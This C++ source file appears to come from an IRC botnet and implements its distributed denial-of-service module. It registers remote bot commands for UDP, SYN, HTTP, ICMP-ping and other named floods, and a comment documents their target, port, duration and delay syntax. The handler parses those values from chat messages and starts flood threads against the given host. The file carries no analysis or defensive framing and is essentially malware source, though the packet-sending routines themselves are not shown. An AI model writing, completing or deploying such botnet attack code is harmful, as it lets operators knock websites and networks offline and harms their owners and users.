

#include "main.h"
#include "mainctrl.h"
#include "ddos.h"

void CDDOS::Init()
{	m_iNumThreads=0; m_bDDOSing=false;
	REGCMD(m_cmdUDP,		"ddos.udpflood",	"starts a UDP flood",						false,	this);
	REGCMD(m_cmdSyn,		"ddos.synflood",	"starts an SYN flood",						false,	this);
	REGCMD(m_cmdHTTP,		"ddos.httpflood",	"starts a HTTP flood",						false,	this);
	REGCMD(m_cmdStop,		"ddos.stop",		"stops all floods",							false,	this);
	REGCMD(m_cmdSKYSyn,	    "ddos.skysyn",		"starts skysyn flood",						false,	this);
    REGCMD(m_cmdPingFlood,   "ddos.pingflood",	"starts ping flood",						false,	this);
	REGCMD(m_cmdPhatWonk,	"ddos.phatwonk",	"starts phatwonk flood",					false,	this);
}

/*
	.ddos.phatsyn <host> <time> <delay> <port>
	 - port 0 = random port

	.ddos.phatwonk <host> <time> <delay>

	.ddos.phaticmp <host> <time> <delay>
	  
	.ddos.synflood <host> <time> <delay> <port>
	 - port 0 = random port
   
	.ddos.udpflood <target> <port>[0=rand] <time>(secs) <delay>(ms)
	
	.ddos.httpflood <url> <number> <referrer> <delay> <recursive>
	 - delay 0 = random delay (1-24h)
	 - recursive = get page resources
*/

bool CDDOS::HandleCommand(CMessage *pMsg)
	{

	if(!pMsg->sCmd.Compare("ddos.phatwonk"))
	{	CDDOSPhatWonkFlood *pTemp=new CDDOSPhatWonkFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }

	if(!pMsg->sCmd.Compare("ddos.skysyn"))
	{	CDDOSSKYSyn *pTemp=new CDDOSSKYSyn; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }
		
	if(!pMsg->sCmd.Compare("ddos.pingflood"))
	{	CDDOSPingFlood *pTemp=new CDDOSPingFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iSize=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }
	
	if(!pMsg->sCmd.Compare("ddos.synflood"))
	{	CDDOSSynFlood *pTemp=new CDDOSSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }

	if(!pMsg->sCmd.Compare("ddos.udpflood"))
	{	CDDOSUDPFlood *pTemp=new CDDOSUDPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iSize=atoi(pMsg->sChatString.Token(4, " ").CStr());
                pTemp->m_iDelay=atoi(pMsg->sChatString.Token(5, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }
        
	if(!pMsg->sCmd.Compare("ddos.httpflood"))
	{	CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
			pTemp->m_bRecursive=true; else pTemp->m_bRecursive=false;
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(true); }

	if(!pMsg->sCmd.Compare("ddos.stop")) m_bDDOSing=false;

	return true; }

void *CDDOSBase::Run()
{	if(!(g_pMainCtrl->m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
	return NULL; }

void CDDOSBase::StartDDOS() {
       // Override plz
}

